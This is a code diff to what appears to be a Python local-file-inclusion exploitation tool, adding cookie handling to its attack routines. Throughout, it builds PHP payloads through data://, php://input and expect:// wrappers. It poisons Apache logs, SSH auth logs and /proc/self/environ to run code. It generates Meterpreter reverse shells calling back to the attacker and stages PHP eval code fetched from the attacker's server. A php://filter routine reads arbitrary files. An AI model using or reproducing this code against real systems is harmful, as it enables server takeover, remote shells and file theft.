@@ -14,33 +14,40 @@ import urlparse
 from urllib import quote_plus
 from os import system
 
+#---------------------------------------------------------------------------------------------------
 
 t = Terminal()
 
+""" Things we will need for staged
+    attacks and log poisoning """
+
 stager_payload = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
-path_traversal_sequences = ['../','..\\','/../','./../']
+path_traversal_sequences = ['../', '..\\', '/../', './../']
+
+#---------------------------------------------------------------------------------------------------
 
 
 def msf_payload():
 
-         # Arguments needed for Meterpreter
+        """ Arguments for Meterpreter """
+
         lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
         lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
 
-        # Generate random shell name
+        """  Generate random shell name """
+
         g = Generator()
         shell = g.generate()
 
-        print(t.green(" [*] ") + "Generating Data Wrapper")
+        print(t.green(" [*] ") + "Generating Wrapper")
         progressbar()
         print(t.red(" [!] ") + "Success!")
         print(t.green(" [*] ") + "Generating Metasploit Payload")
         progressbar()
 
-        # msfpayload arguments
-        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
+        """ MSF payload generation """
 
-        # Generate shell
+        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
 
         try:
             msf = subprocess.Popen(php, shell=True)
@@ -53,6 +60,15 @@ def msf_payload():
                 print(t.red(" [!] ") + "Payload Is Located At: /tmp/{0}.php").format(shell)
 
         return lhost, lport, shell
+
+#---------------------------------------------------------------------------------------------------
+
+
+def format_cookies(cookies):
+    c = dict(item.split("=") for item in cookies.split(";"))
+    return c
+
+#---------------------------------------------------------------------------------------------------
 
 
 def progressbar():
@@ -69,19 +85,24 @@ def progressbar():
 
     sys.stdout.write("\n")
 
+#---------------------------------------------------------------------------------------------------
+
 
 class Data:
 
-    def __init__(self, target, nostager):
+    def __init__(self, target, nostager, cookies):
 
         self.target = target
         self.nostager = nostager
+        self.cookies = cookies
 
     def execute_data(self):
 
             lhost, lport, shell = msf_payload()
 
-            # Build payload
+            """ Build payload """
+            """ Handle staging """
+
             if self.nostager:
                 payload_file = open("/tmp/{0}.php".format(shell), "r")
                 payload = payload_file.read()
@@ -91,7 +112,8 @@ class Data:
 
             encoded_payload = quote_plus(payload.encode('base64'))
 
-            # Build data wrapper
+            """ Build data wrapper """
+
             data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
             lfi = self.target + data_wrapper
 
@@ -101,39 +123,55 @@ class Data:
             if self.nostager:
                 progressbar()
             else:
-                # Assuming if there is a server running on port 8000 hosting from /tmp
                 print(t.red(" [!] ") + "Is Your Server Running?")
                 print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
                 print(t.green(" [*] ") + "Downloading Shell")
                 progressbar()
 
             raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
-            # LFI payload that downloads the shell
-            data_request = requests.get(lfi)
 
-            # Try block for actual attack
-            try:
-                if data_request.status_code != 200:
-                    print(t.red(" [!] ") + "Unexpected HTTP Response ")
-                    sys.exit(1)
-            except requests.exceptions.RequestException as data_error:
-                print(t.red(" [!] ") + "HTTP Error")(data_error)
+            """ LFI payload that downloads the shell with try block for actual
+                attack """
+
+            if self.cookies:
+                f_cookies = format_cookies(self.cookies)
+                try:
+                    data_request = requests.get(lfi, cookies=f_cookies)
+                    if data_request.status_code != 200:
+                        print(t.red(" [!] ") + "Unexpected HTTP Response ")
+                        sys.exit(1)
+                except requests.exceptions.RequestException as data_error:
+                    print(t.red(" [!] ") + "HTTP Error")(data_error)
+            else:
+                try:
+                    data_request = requests.get(lfi)
+                    if data_request.status_code != 200:
+                        print(t.red(" [!] ") + "Unexpected HTTP Response ")
+                        sys.exit(1)
+                except requests.exceptions.RequestException as data_error:
+                    print(t.red(" [!] ") + "HTTP Error")(data_error)
+
+#---------------------------------------------------------------------------------------------------
 
 
 class Input:
 
-    def __init__(self, target, nostager):
+    def __init__(self, target, nostager, cookies):
 
         self.target = target
         self.nostager = nostager
+        self.cookies = cookies
 
     def execute_input(self):
 
         lhost, lport, shell = msf_payload()
 
-        # Build php payload
+        """ Build payload """
+
         wrapper = "php://input"
         url = self.target + wrapper
+
+        """ Handle staging """
 
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell), "r")
@@ -148,7 +186,6 @@ class Input:
         if self.nostager:
             progressbar()
         else:
-            # Assuming if there is a server running on port 8000 hosting from /tmp
             print(t.red(" [!] ") + "Is Your Server Running?")
             print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
             print(t.green(" [*] ") + "Downloading Shell")
@@ -156,21 +193,36 @@ class Input:
 
         raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler Is Running ...")
 
-        try:
-            dr = requests.post(url, data=payload)
-            if dr.status_code != 200:
-                print t.red(" [*] Unexpected HTTP Response ")
-                sys.exit(1)
-        except requests.exceptions.RequestException as input_error:
-            print t.red(" [*] HTTP Error ")(input_error)
+        """ Handle cookies """
+
+        if self.cookies:
+            f_cookies = format_cookies(self.cookies)
+            try:
+                input_request = requests.post(url, data=payload, cookies=f_cookies)
+                if input_request.status_code != 200:
+                    print t.red(" [*] Unexpected HTTP Response ")
+                    sys.exit(1)
+            except requests.exceptions.RequestException as input_error:
+                print t.red(" [*] HTTP Error ")(input_error)
+        else:
+            try:
+                input_request = requests.post(url, data=payload)
+                if input_request.status_code != 200:
+                    print t.red(" [*] Unexpected HTTP Response ")
+                    sys.exit(1)
+            except requests.exceptions.RequestException as input_error:
+                print t.red(" [*] HTTP Error ")(input_error)
+
+#---------------------------------------------------------------------------------------------------
 
 
 class Expect:
 
-    def __init__(self, target, nostager):
+    def __init__(self, target, nostager, cookies):
 
         self.target = target
         self.nostager = nostager
+        self.cookies = cookies
 
     def execute_expect(self):
 
@@ -179,7 +231,9 @@ class Expect:
         handle = Payload(lhost, lport, self.target, shell)
         handle.handler()
 
-        # Build payload
+        """ Build payload """
+        """ Handle staging """
+
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
             payload = "expect://echo \""
@@ -192,27 +246,41 @@ class Expect:
             print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
+
         lfi = self.target + payload
 
         raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
 
+        if self.cookies:
+            f_cookies = format_cookies(self.cookies)
         try:
-            r = requests.get(lfi)
+            r = requests.get(lfi, cookies=f_cookies)
             if r.status_code != 200:
                 print(t.red(" [!] Unexpected HTTP Response "))
                 sys.exit(1)
         except requests.exceptions.RequestException as expect_error:
             print t.red(" [!] HTTP Error ")(expect_error)
+        else:
+            try:
+                r = requests.get(lfi, cookies=f_cookies)
+                if r.status_code != 200:
+                    print(t.red(" [!] Unexpected HTTP Response "))
+                    sys.exit(1)
+            except requests.exceptions.RequestException as expect_error:
+                print t.red(" [!] HTTP Error ")(expect_error)
+
+#---------------------------------------------------------------------------------------------------
 
 
 class Logs:
 
-    def __init__(self, target, location, nostager, relative):
+    def __init__(self, target, location, nostager, relative, cookies):
 
         self.target = target
-        self.location = location  # /var/log/apache2/access.log
+        self.location = location
         self.nostager = nostager
         self.relative = relative
+        self.cookies = cookies
 
     def execute_logs(self):
 
@@ -221,6 +289,8 @@ class Logs:
         handle = Payload(lhost, lport, self.target, shell)
         handle.handler()
 
+        """ Handle staging """
+
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
             payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
@@ -231,37 +301,65 @@ class Logs:
             print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
+
         lfi = self.target + self.location
 
         raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
-        try:
-            headers = {'User-Agent': payload}
-            r = requests.get(lfi, headers=headers)
-            if r.status_code != 200:
-                print(t.red(" [!] Unexpected HTTP Response "))
-            else:
-                if not self.relative:
-                    r = requests.get(lfi)  # pull down shell from poisoned logs
-                    if r.status_code != 200:
-                        print(t.red(" [!] Unexpected HTTP Response "))
+
+        if self.cookies:
+            f_cookies = format_cookies(self.cookies)
+            try:
+                headers = {'User-Agent': payload}
+                r = requests.get(lfi, headers=headers, cookies=f_cookies)
+                if r.status_code != 200:
+                    print(t.red(" [!] Unexpected HTTP Response "))
                 else:
-                    for path_traversal_sequence in path_traversal_sequences:
-                        for counter in xrange(10):
-                            lfi = self.target + path_traversal_sequence*counter + self.location
-                            r = requests.get(lfi)  # pull down shell from poisoned logs
-                            if r.status_code != 200:
-                                print(t.red(" [!] Unexpected HTTP Response "))
-        except requests.exceptions.RequestException as access_error:
-            print t.red(" [!] HTTP Error ")(access_error)
+                    if not self.relative:
+                        r = requests.get(lfi)
+                        if r.status_code != 200:
+                            print(t.red(" [!] Unexpected HTTP Response "))
+                    else:
+                        for path_traversal_sequence in path_traversal_sequences:
+                            for counter in xrange(10):
+                                lfi = self.target + path_traversal_sequence*counter + self.location
+                                r = requests.get(lfi)
+                                if r.status_code != 200:
+                                    print(t.red(" [!] Unexpected HTTP Response "))
+            except requests.exceptions.RequestException as access_error:
+                print t.red(" [!] HTTP Error ")(access_error)
+        else:
+            try:
+                headers = {'User-Agent': payload}
+                r = requests.get(lfi, headers=headers)
+                if r.status_code != 200:
+                    print(t.red(" [!] Unexpected HTTP Response "))
+                else:
+                    if not self.relative:
+                        r = requests.get(lfi)
+                        if r.status_code != 200:
+                            print(t.red(" [!] Unexpected HTTP Response "))
+                    else:
+                        for path_traversal_sequence in path_traversal_sequences:
+                            for counter in xrange(10):
+                                lfi = self.target + path_traversal_sequence*counter + self.location
+                                r = requests.get(lfi)
+                                if r.status_code != 200:
+                                    print(t.red(" [!] Unexpected HTTP Response "))
+            except requests.exceptions.RequestException as access_error:
+                print t.red(" [!] HTTP Error ")(access_error)
+
+#---------------------------------------------------------------------------------------------------
+
 
 class Environ:
 
-    def __init__(self, target, nostager, relative):
+    def __init__(self, target, nostager, relative, cookies):
 
         self.target = target
         self.nostager = nostager
         self.relative = relative
         self.location = "/proc/self/environ"
+        self.cookies = cookies
 
     def execute_environ(self):
 
@@ -270,6 +368,8 @@ class Environ:
         handle = Payload(lhost, lport, self.target, shell)
         handle.handler()
 
+        """ Handle staging """
+
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
             payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
@@ -280,32 +380,63 @@ class Environ:
             print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
+
+        """ Build LFI """
+
         lfi = self.target + self.location
         headers = {'User-Agent': payload}
 
         raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
         try:
             if not self.relative:
-                r = requests.get(lfi, headers=headers)
-                if r.status_code != 200:
-                    print(t.red(" [!] Unexpected HTTP Response "))
+                if self.cookies:
+                    f_cookies = format_cookies(self.cookies)
+                    try:
+                        r = requests.get(lfi, headers=headers, cookies=f_cookies)
+                        if r.status_code != 200:
+                            print(t.red(" [!] Unexpected HTTP Response "))
+                    except requests.RequestException as access_error:
+                        print t.red(" [!] HTTP Error ")(access_error)
+                else:
+                    try:
+                        r = requests.get(lfi, headers=headers)
+                        if r.status_code != 200:
+                            print(t.red(" [!] Unexpected HTTP Response "))
+                    except requests.RequestException as access_error:
+                        print t.red(" [!] HTTP Error ")(access_error)
             else:
                 for path_traversal_sequence in path_traversal_sequences:
                     for counter in xrange(10):
                         lfi = self.target + path_traversal_sequence*counter + self.location
-                        r = requests.get(lfi, headers=headers)  # pull down shell from poisoned logs
-                        if r.status_code != 200:
-                            print(t.red(" [!] Unexpected HTTP Response "))
-        except requests.exceptions.RequestException as access_error:
-            print t.red(" [!] HTTP Error ")(access_error)
+                        if self.cookies:
+                            f_cookies = format_cookies(self.cookies)
+                            try:
+                                r = requests.get(lfi, headers=headers, cookies=f_cookies)
+                                if r.status_code != 200:
+                                    print(t.red(" [!] Unexpected HTTP Response "))
+                            except requests.RequestException as access_error:
+                                print t.red(" [!] HTTP Error ")(access_error)
+                        else:
+                            try:
+                                r = requests.get(lfi, headers=headers)
+                                if r.status_code != 200:
+                                    print(t.red(" [!] Unexpected HTTP Response "))
+                            except requests.RequestException as access_error:
+                                print t.red(" [!] HTTP Error ")(access_error)
+        except Exception as unknown_error:
+            print t.red(" [!] Unknown Error ")(unknown_error)
+
+#---------------------------------------------------------------------------------------------------
+
 
 class SSHLogs:
 
-    def __init__(self, target, location, relative):
+    def __init__(self, target, location, relative, cookies):
 
         self.target = target
-        self.location = location  # /var/log/auth.log
+        self.location = location
         self.relative = relative
+        self.cookies = cookies
 
     def execute_ssh(self):
 
@@ -319,59 +450,102 @@ class SSHLogs:
         payload_stage2 = quote_plus(payload_file.read())
         payload_file.close()
         payload = "<?php eval(\\$_GET['code'])?>"
-        print(t.blue(" [!] ") + "Enter fake passwords to perform SSH log poisoning...")
+        print(t.blue(" [!] ") + "Enter fake passwords to perform SSH log poisoning ...")
         host = urlparse.urlsplit(self.target).netloc
-        system('/usr/bin/ssh "{0}@{1}"'.format(payload,host))
+        system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))
 
         print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
-        print(t.green(" [*] ") + "Downloading Shell")
+        print(t.green(" [*] ") + "Executing Shell")
         progressbar()
-        
+
+        """ Attempt traverse """
 
         if not self.relative:
             lfi = self.target + self.location + '&code={0}'.format(payload_stage2)
-            try:
-                r = requests.get(lfi)  # pull down shell from poisoned logs
-                if r.status_code != 200:
-                    print(t.red(" [!] Unexpected HTTP Response "))
-            except requests.exceptions.RequestException as access_error:
-                print t.red(" [!] HTTP Error ")(access_error)
+            if self.cookies:
+                f_cookies = format_cookies(self.cookies)
+                try:
+                    r = requests.get(lfi, cookies=f_cookies)
+                    if r.status_code != 200:
+                        print(t.red(" [!] Unexpected HTTP Response "))
+                except requests.exceptions.RequestException as access_error:
+                    print t.red(" [!] HTTP Error ")(access_error)
+            else:
+                try:
+                    r = requests.get(lfi)
+                    if r.status_code != 200:
+                        print(t.red(" [!] Unexpected HTTP Response "))
+                except requests.exceptions.RequestException as access_error:
+                    print t.red(" [!] HTTP Error ")(access_error)
 
         else:
             for path_traversal_sequence in path_traversal_sequences:
                 for counter in xrange(10):
                     lfi = self.target + path_traversal_sequence*counter + self.location + '&code={0}'.format(payload_stage2)
-                    try:
-                        r = requests.get(lfi)  # pull down shell from poisoned logs
-                        if r.status_code != 200:
-                            print(t.red(" [!] Unexpected HTTP Response "))
-                    except requests.exceptions.RequestException as access_error:
-                        print t.red(" [!] HTTP Error ")(access_error)
+                    if self.cookies:
+                        f_cookies = format_cookies(self.cookies)
+                        try:
+                            r = requests.get(lfi, cookies=f_cookies)
+                            if r.status_code != 200:
+                                print(t.red(" [!] Unexpected HTTP Response "))
+                        except requests.exceptions.RequestException as access_error:
+                            print t.red(" [!] HTTP Error ")(access_error)
+                    else:
+                        try:
+                            r = requests.get(lfi)
+                            if r.status_code != 200:
+                                print(t.red(" [!] Unexpected HTTP Response "))
+                        except requests.exceptions.RequestException as access_error:
+                            print t.red(" [!] HTTP Error ")(access_error)
+
+#---------------------------------------------------------------------------------------------------
 
 
 class Filter:
 
-    def __init__(self, target):
+    def __init__(self, target, cookies):
 
         self.target = target
+        self.cookies = cookies
 
     def execute_filter(self):
 
-        f_file = raw_input(t.green(" [*] ") + "Please Enter File To Read: ")   # filter file
+        """ Build payload """
+
+        f_file = raw_input(t.green(" [*] ") + "Please Enter File To Read: ")
         payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)
         lfi = self.target + payload
 
-        try:
-            r = requests.get(lfi)
-            if r.status_code != 200:
-                print(t.red(" [!] Unexpected HTTP Response "))
-            else:
-                progressbar()
-                try:
-                    result = base64.b64decode(r.text)
-                    print(t.red(" [!] ") + "Decoded: " + t.red(textwrap.fill(result)))  # needs better wrapping
-                except TypeError as type_error:
-                    print(t.red(" [!] ") + "Incorrect Padding - Check File!") + type_error  # handle padding issues
-                    sys.exit(1)
-        except requests.exceptions.RequestException as filter_error:
-            print t.red(" [!] HTTP Error ")(filter_error)
+        """ Handle cookies """
+
+        if self.cookies:
+            f_cookies = format_cookies(self.cookies)
+            try:
+                r = requests.get(lfi, cookies=f_cookies)
+                if r.status_code != 200:
+                    print(t.red(" [!] Unexpected HTTP Response "))
+                else:
+                    progressbar()
+                    try:
+                        result = base64.b64decode(r.text)
+                        print(t.blue(" [*] ") + "Decoded: " + t.blue(textwrap.fill(result)))
+                    except TypeError as type_error:
+                        print(type_error)
+                        sys.exit(1)
+            except requests.exceptions.RequestException as filter_error:
+                print t.red(" [!] HTTP Error ")(filter_error)
+        else:
+            try:
+                r = requests.get(lfi)
+                if r.status_code != 200:
+                    print(t.red(" [!] Unexpected HTTP Response "))
+                else:
+                    progressbar()
+                    try:
+                        result = base64.b64decode(r.text)
+                        print(t.blue(" [*] ") + "Decoded: " + t.blue(textwrap.fill(result)))
+                    except TypeError as type_error:
+                        print(type_error)
+                        sys.exit(1)
+            except requests.exceptions.RequestException as filter_error:
+                print t.red(" [!] HTTP Error ")(filter_error)
